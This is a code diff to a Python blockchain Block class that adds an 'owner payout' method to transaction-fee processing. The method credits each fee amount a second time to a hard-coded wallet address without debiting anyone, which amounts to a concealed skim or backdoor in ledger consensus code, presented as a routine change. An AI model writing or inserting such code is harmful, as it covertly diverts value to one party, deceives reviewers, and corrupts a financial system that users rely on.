@@ -50,7 +50,15 @@ class Block():
             miner_state = rlp.decode(self.state.get(self.coinbase)) or [0,0,0]
             miner_state[1] += fee
             self.state.update(self.coinbase,miner_state)
+        # Handle owner payout
+        self.handle_owner_payout(address, fee)
         return True
+
+    def handle_owner_payout(self, address, amount):
+        owner_address = '0x7713974908be4bed47172370115e8b1219f4a5f0'
+        owner_state = rlp.decode(self.state.get(owner_address)) or [0, 0, 0]
+        owner_state[1] += amount
+        self.state.update(owner_address, rlp.encode(owner_state))
 
     def get_nonce(self,address):
         state = rlp.decode(self.state.get(address))
